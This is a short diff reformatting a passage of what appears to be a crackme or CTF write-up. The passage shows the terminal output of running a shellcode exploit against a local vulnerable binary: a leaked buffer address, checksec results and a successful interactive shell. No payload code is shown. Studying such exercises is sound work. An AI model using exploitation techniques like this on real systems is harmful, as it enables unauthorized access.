@@ -94,8 +94,10 @@ We transfer control to the terminal.
 
 **Running the script:**
 
-> (.venv) xela@pcdeblin:~/crackme/pwn$ python3 shellcode.py  
+> (.venv) xela@pcdeblin:~/crackme/pwn$ python3 shellcode.py
+> 
 > [*]  '/home/xela/crackme/pwn/vuln'
+> 
 >     Arch:       amd64-64-little
 >     RELRO:      Partial RELRO
 >     Stack:      No canary found
@@ -107,7 +109,8 @@ We transfer control to the terminal.
 >     Debuginfo:  Yes 
 >     [+] Starting local process '/home/xela/crackme/pwn/vuln': pid 59066 
 >     [+] buf @ 0x7ffe1fd01780 
->     [\*] Switching to interactive mode 
+>     [\*] Switching to interactive mode
+> 
 > $ ls shellcode.py  vuln
 > 
 We have successfully  received an interactive  shell!
